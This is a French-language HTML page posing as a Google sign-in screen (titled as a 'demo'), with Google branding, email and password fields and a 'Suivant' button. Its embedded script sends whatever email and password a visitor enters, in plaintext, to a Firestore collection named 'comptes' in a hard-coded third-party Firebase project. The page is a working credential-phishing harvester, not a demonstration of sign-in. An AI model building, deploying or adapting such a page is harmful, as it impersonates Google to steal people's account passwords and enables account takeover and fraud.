<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Connexion Google (Démo)</title>

  <!-- Import Firebase depuis le CDN -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore.js";

    // ✅ Ton vrai projet Firebase :
    const firebaseConfig = {
      apiKey: "AIzaSyBLXGaUM6cax4Fdef7r6dNU8v_SS0u-vWo",
      authDomain: "fir-d787b.firebaseapp.com",
      projectId: "fir-d787b",
      storageBucket: "fir-d787b.firebasestorage.app",
      messagingSenderId: "322798542153",
      appId: "1:322798542153:web:30002e7a01f227df1f4e98",
      measurementId: "G-FC7YG73HB8"
    };

    // Initialisation Firebase
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    window.addEventListener("DOMContentLoaded", () => {
      const form = document.getElementById("registerForm");

      form.addEventListener("submit", async (e) => {
        e.preventDefault();
        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;

        try {
          await addDoc(collection(db, "comptes"), {
            username,
            password
          });
          alert("✅ Compte créé avec succès !");
          form.reset();
        } catch (err) {
          alert("❌ Erreur : " + err.message);
        }
      });
    });
  </script>

  <style>
    body {
      background-color: #f1f1f1;
      font-family: "Roboto", Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      width: 320px;
      text-align: center;
    }
    .login-box img {
      width: 80px;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 14px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #1a73e8;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 14px;
      cursor: pointer;
    }
    button:hover {
      background-color: #155ab6;
    }
    p {
      font-size: 12px;
      color: #5f6368;
      margin-top: 20px;
    }
  </style>
</head>

<body>
  <div class="login-box">
    <img src="Google.png" alt="Google logo" />
    <h2>Connexion</h2>
    <form id="registerForm">
      <input type="email" id="username" placeholder="Adresse e-mail" required />
      <input type="password" id="password" placeholder="Mot de passe" required />
      <button type="submit">Suivant</button>
    </form>
  </div>
</body>
</html>
